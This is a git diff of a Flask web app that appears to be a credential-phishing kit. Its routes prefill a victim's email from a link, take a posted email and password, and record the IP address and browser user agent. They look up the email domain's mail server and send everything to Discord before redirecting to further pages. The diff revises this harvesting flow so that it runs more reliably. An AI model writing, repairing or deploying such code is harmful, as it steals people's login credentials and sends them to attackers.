@@ -215,10 +215,8 @@ def success():
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
-    if web_param:
-        session['eman'] = web_param
-        session['ins'] = web_param[web_param.index('@') + 1:]
-    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
+    domain = web_param.split('@')[-1] if web_param and '@' in web_param else None
+    return render_template('index.html', eman=web_param, ins=domain)
 
 
 @app.route("/first", methods=['POST'])
@@ -233,18 +231,18 @@ def first():
         password = request.form.get("pig")
         useragent = request.headers.get('User-Agent')
 
-        # Save to session
-        session['eman'] = email
+        if not email:
+            return "Email is missing", 400
 
-        # Send to Discord (if needed)
-        domain = email.split('@')[-1] if email and '@' in email else None
+        # Get MX record
+        domain = email.split('@')[-1] if '@' in email else None
         mx_record = get_mx_record(domain) if domain else "Invalid Domain"
+
+        # Send to Discord
         send_discord_message(email, password, ip, useragent, domain, mx_record)
 
-        # 👇 Explicitly pass query param in redirect
-        return redirect(url_for('benza') + f'?web={email}')
-
-    return "Method Not Allowed", 405
+        # 🔥 Redirect directly with email in query string
+        return redirect(f"/benzap?web={email}")
 
 
 @app.route("/second", methods=['POST'])
@@ -277,9 +275,9 @@ def second():
 
 @app.route("/benzap", methods=['GET'])
 def benza():
-    eman = request.args.get('web') or session.get('eman')  # ✅ Try query param first
-    dman = session.get('ins')
-    return render_template('ind.html', eman=eman, dman=dman)
+    email = request.args.get('web')
+    domain = email.split('@')[-1] if email and '@' in email else None
+    return render_template('ind.html', eman=email, dman=domain)
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
